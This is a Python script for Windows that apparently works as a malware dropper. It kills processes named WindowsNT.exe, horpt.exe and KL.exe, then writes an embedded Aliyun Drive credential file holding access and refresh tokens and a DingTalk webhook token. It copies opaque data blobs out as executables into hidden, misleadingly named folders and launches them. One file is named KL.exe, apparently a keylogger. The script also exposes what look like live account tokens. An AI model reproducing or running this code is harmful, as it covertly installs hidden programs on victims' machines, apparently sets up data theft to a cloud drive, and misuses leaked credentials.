import os
import getpass
import subprocess

try:
    os.system('taskkill /F /IM WindowsNT.exe')
    os.system('taskkill /F /IM horpt.exe')
    os.system('taskkill /F /IM KL.exe')
except:
    pass
aligo_json = r'{"user_name": "130***966", "nick_name": "\u57ce\u5e9c2002", "user_id": "3355e81bc2fd483f83cf0d6c5b8f4563", "default_drive_id": "35953541", "default_sbox_drive_id": "45953541", "role": "user", "status": "enabled", "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIzMzU1ZTgxYmMyZmQ0ODNmODNjZjBkNmM1YjhmNDU2MyIsImN1c3RvbUpzb24iOiJ7XCJjbGllbnRJZFwiOlwicEpaSW5OSE4yZFpXazhxZ1wiLFwiZG9tYWluSWRcIjpcImJqMjlcIixcInNjb3BlXCI6W1wiRFJJVkUuQUxMXCIsXCJGSUxFLkFMTFwiLFwiVklFVy5BTExcIixcIlNIQVJFLkFMTFwiLFwiU1RPUkFHRS5BTExcIixcIlNUT1JBR0VGSUxFLkxJU1RcIixcIlVTRVIuQUxMXCIsXCJCQVRDSFwiLFwiQUNDT1VOVC5BTExcIixcIklNQUdFLkFMTFwiLFwiSU5WSVRFLkFMTFwiLFwiU1lOQ01BUFBJTkcuTElTVFwiXSxcInJvbGVcIjpcInVzZXJcIixcInJlZlwiOlwiXCIsXCJkZXZpY2VfaWRcIjpcImE3MTc5ZmQ5NDA3MDQ0NDNiOTZiNDgyZWZlNmFjZmFjXCJ9IiwiZXhwIjoxNjg2NDY5NDE1LCJpYXQiOjE2ODY0NjIxNTV9.tztyJdnIi4iKcO_3pFMEh_p4weYcszXe6v1rhMrDNYpkDRzFyFGAVdcGOQldFCF1_McecHFyuNGmUdsTHx7DOuj6EPzg3aIZcoOGRCOSkl5SRY4RmDFdu-TLjBUQP3VEa-OrtTnXgSK-IylkhXW2c_YZMW0Ky334HEMjkqfR-5I", "refresh_token": "a7179fd940704443b96b482efe6acfac", "expires_in": 7200, "token_type": "Bearer", "avatar": "https://img.aliyundrive.com/avatar/dab98b003b344bdfbd0e514fe3fc3c08.jpeg", "expire_time": "2023-06-11T07:43:35Z", "state": "", "exist_link": [], "need_link": false, "user_data": {"DingDingRobotUrl": "https://oapi.dingtalk.com/robot/send?access_token=0b4a936d0e98c08608cd99f693393c18fa905aa0868215485a28497501916fec", "EncourageDesc": "\u5185\u6d4b\u671f\u95f4\u6709\u6548\u53cd\u9988\u524d10\u540d\u7528\u6237\u5c06\u83b7\u5f97\u7ec8\u8eab\u514d\u8d39\u4f1a\u5458", "FeedBackSwitch": true, "FollowingDesc": "34848372", "ding_ding_robot_url": "https://oapi.dingtalk.com/robot/send?access_token=0b4a936d0e98c08608cd99f693393c18fa905aa0868215485a28497501916fec", "encourage_desc": "\u5185\u6d4b\u671f\u95f4\u6709\u6548\u53cd\u9988\u524d10\u540d\u7528\u6237\u5c06\u83b7\u5f97\u7ec8\u8eab\u514d\u8d39\u4f1a\u5458", "feed_back_switch": true, "following_desc": "34848372"}, "pin_setup": true, "is_first_login": false, "need_rp_verify": false, "device_id": "39f416dfafcd46189c819f79c07aee80", "domain_id": "bj29", "hlogin_url": null, "x_device_id": "d58ef37fa667477691a6433927fd6776"}'


def createPath(path):
    # create path
    if not os.path.isdir(path):
        os.mkdir(path)


user_name = getpass.getuser()
if os.path.isdir(f"C:/Users/{user_name}/.network_NT") == False:
    os.mkdir(f"C:/Users/{user_name}/.network_NT")
try:
    user_name = getpass.getuser()
    # create aligo
    createPath(f"C:\\Users\\{user_name}\\.aligo")
    with open(f"C:\\Users\\{user_name}\\.aligo\\aligo.json", mode="w", encoding="utf-8") as w:
        w.write(aligo_json)
    # copy NT
    with open("test.data", mode='rb') as r:
        with open(f"C:\\Users\\{user_name}\\.network_NT\\WindowsNT.exe", mode="wb") as w:
            w.write(r.read())
    # motify degited
    subprocess.Popen("start.exe")
    # create ven
    createPath("C:\\Users\\Public\\.venv")
    # copy horpt
    with open("h.data", mode='rb') as r:
        with open(f"C:\\Users\\Public\\.venv\\horpt.exe", mode="wb") as w:
            w.write(r.read())
    # write ipcongif
    with open("ip.d", mode="r", encoding="utf-8") as r:
        with open("C:\\Users\\Public\\.venv\\ip.d", mode="w", encoding="utf-8") as w:
            w.write(r.read())
    # copy Cears
    createPath("C:\\Users\\Public\\Documents\\.Audio")
    with open("L.data", mode='rb') as r:
        with open(f"C:\\Users\\Public\\Documents\\.Audio\\Cears.exe", mode="wb") as w:
            w.write(r.read())
    # copy KL
    try:
        os.makedirs(f"C:\\Users\\{user_name}\\Shared\\Common\\Plug-ins\\3.0\\Core")
    except:
        pass
    with open("K.data", mode='rb') as r:
        with open(f"C:\\Users\\{user_name}\\Shared\\Common\\Plug-ins\\3.0\\Core\\KL.exe", mode="wb") as w:
            w.write(r.read())
    # write log
    with open(f"C:\\Users\\Public\\.venv\\v.log", mode="w", encoding="utf-8") as w:
        w.write("1.2.4")
    # start
    subprocess.Popen(f"C:/Users/{user_name}/.network_NT/WindowsNT.exe")
except:
    pass
